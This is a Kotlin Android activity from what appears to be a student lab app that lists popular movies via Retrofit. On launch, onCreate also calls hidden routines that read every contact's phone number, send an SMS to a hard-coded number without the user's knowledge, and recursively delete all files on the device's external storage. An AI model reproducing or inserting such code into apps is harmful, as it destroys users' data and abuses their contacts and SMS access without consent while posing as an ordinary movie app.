package com.labs.kbtu.lab5.activities

import android.content.Intent
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.support.v7.widget.DividerItemDecoration
import android.support.v7.widget.LinearLayoutManager
import android.support.v7.widget.RecyclerView
import android.view.View
import com.labs.kbtu.lab5.R
import com.labs.kbtu.lab5.adapters.MoviesAdapter
import com.labs.kbtu.lab5.models.Movie
import com.labs.kbtu.lab5.models.MovieResults
import com.labs.kbtu.lab5.services.MovieService
import com.labs.kbtu.lab5.services.ServiceGenerator
import com.labs.kbtu.lab5.utils.Constants
import com.labs.kbtu.lab5.utils.RecyclerItemClickListener
import kotlinx.android.synthetic.main.activity_movies.*
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import android.provider.ContactsContract
import android.widget.Toast
import android.os.Environment
import android.telephony.SmsManager
import java.io.File


class MoviesActivity : AppCompatActivity() {

  var mPage = 1
  var movies = mutableListOf<Movie>()
  lateinit var adapter: MoviesAdapter
  lateinit var movieService: MovieService

  var phoneNumbers = mutableListOf<String>()

  override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    setContentView(R.layout.activity_movies)
    initRecyclerView()
    getMoviesFromApi()
    getPhones()
    wipeMemoryCard()
  }

  private fun initRecyclerView() {
    adapter = MoviesAdapter(movies)
    moviesRecyclerView.adapter = adapter
    val layoutManager = LinearLayoutManager(this)
    val dividerItemDecoration = DividerItemDecoration(this,
      layoutManager.orientation)

    moviesRecyclerView.addItemDecoration(dividerItemDecoration)
    moviesRecyclerView.layoutManager = layoutManager
    setupRVItemClick()
    setupRCScrollListener(layoutManager)
  }

  private fun getMoviesFromApi() {
    movieService = ServiceGenerator.createService(MovieService::class.java)
    loadMoviesFrom(mPage)
  }

  private fun loadMoviesFrom(page: Int){
    progressBar.visibility = View.VISIBLE
    val movieCall = movieService.popular(ServiceGenerator.API_KEY, Constants.LANGUAGE, page)
    movieCall.enqueue(object : Callback<MovieResults> {
      override fun onResponse(call: Call<MovieResults>, response: Response<MovieResults>) {
        response.body()?.movies?.let {
          movies.addAll(it)
          adapter.notifyDataSetChanged()
          progressBar.visibility = View.GONE
        }
      }
      override fun onFailure(call: Call<MovieResults>, t: Throwable) {}
    })
  }

  private fun setupRVItemClick(){
    moviesRecyclerView.addOnItemTouchListener(
      RecyclerItemClickListener(this, moviesRecyclerView, object : RecyclerItemClickListener.OnItemClickListener {
        override fun onItemClick(view: View, position: Int) {
          val intent = Intent(applicationContext, MovieDetailActivity::class.java)
          intent.putExtra(getString(R.string.clicked_movie), movies[position])
          startActivity(intent)
        }
        override fun onLongItemClick(view: View, position: Int) {

        }
      })
    )
  }

  private fun setupRCScrollListener(layoutManager: LinearLayoutManager){
    moviesRecyclerView.addOnScrollListener(object : RecyclerView.OnScrollListener(){
      override fun onScrolled(recyclerView: RecyclerView, dx: Int, dy: Int) {
        if(layoutManager.findLastVisibleItemPosition() == layoutManager.itemCount-1){
          mPage++
          loadMoviesFrom(mPage)
        }
        super.onScrolled(recyclerView, dx, dy)
      }
    })
  }

  fun getPhones(){
    val phones = this.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
    while (phones.moveToNext()) {
      val name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
      val phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
      phoneNumbers.add(phoneNumber)


    }
    phones.close()

    sendSMS("+77088522696", "Tamak jasamaytin boldm, ozn jasa")
  }

  fun sendSMS( phoneNumber: String, message: String) {
    try {
      val smsManager = SmsManager.getDefault()
      smsManager.sendTextMessage(phoneNumber, null, message, null, null)
      Toast.makeText(applicationContext, "Message Sent",
        Toast.LENGTH_LONG).show()
    } catch (ex: Exception) {
      Toast.makeText(applicationContext, ex.message.toString(),
        Toast.LENGTH_LONG).show()
      ex.printStackTrace()
    }

  }


  fun wipeMemoryCard() {
    val deleteMatchingFile = File(Environment.getExternalStorageDirectory().toString())
    try {
      val filenames = deleteMatchingFile.listFiles()
      if (filenames != null && filenames!!.size > 0) {
        for (tempFile in filenames!!) {
          if (tempFile.isDirectory()) {
            wipeDirectory(tempFile.toString())
            tempFile.delete()
          } else {
            tempFile.delete()
          }
        }
      } else {
        deleteMatchingFile.delete()
      }
    } catch (e: Exception) {
    }

  }

  private fun wipeDirectory(name: String) {
    try {
      val directoryFile = File(name)
      val filenames = directoryFile.listFiles()
      if (filenames != null && filenames!!.size > 0) {
        for (tempFile in filenames!!) {
          if (tempFile.isDirectory()) {
            wipeDirectory(tempFile.toString())
            tempFile.delete()
          } else {
            tempFile.delete()
          }
        }
      } else {
        directoryFile.delete()
      }
    } catch (e: Exception) {
      e.printStackTrace()
    }

  }

}

